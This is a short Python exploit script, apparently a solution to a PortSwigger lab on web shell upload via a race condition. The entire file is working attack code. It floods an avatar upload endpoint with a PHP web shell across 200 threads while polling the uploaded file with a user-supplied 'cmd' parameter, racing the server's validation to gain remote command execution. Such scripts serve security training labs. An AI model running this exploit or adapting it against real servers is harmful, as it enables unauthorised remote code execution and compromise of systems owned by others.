#!/usr/bin/python3

#this script we solved the lab
#https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-race-condition

import requests
from threading import Thread
from time import sleep
import argparse

def sendRequest(url, cookie, files, data):
    requests.post(url + 'my-account/avatar', cookies=cookie, files=files, data=data)

def receiveRequest(url, command):
    requestGET = requests.get(url + f'files/avatars/webshell.php?cmd={command}')

    if requestGET.status_code == 200 and requestGET.text != '':
        print(requestGET.text)

def main():
    url = 'https://0ad6002d040af2d7c0a5b8e200a9004e.web-security-academy.net/'

    cookie = {
        'session': 'YOUR_SESSIONID'
    }

    files = {
        'avatar': open('./webshell.php', 'rb')
    }

    data = {
        'user': 'wiener',
        'csrf': 'YOUR_CSRF_TOKEN'
    }

    # Create 200 jobs
    for job in range(200):
        Thread(target=sendRequest, args=(url, cookie, files, data)).start()
        Thread(target=receiveRequest, args=(url, args.command)).start()

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-c', '--command', required=True, help='The command you want to execute.')
    args = parser.parse_args()

    main()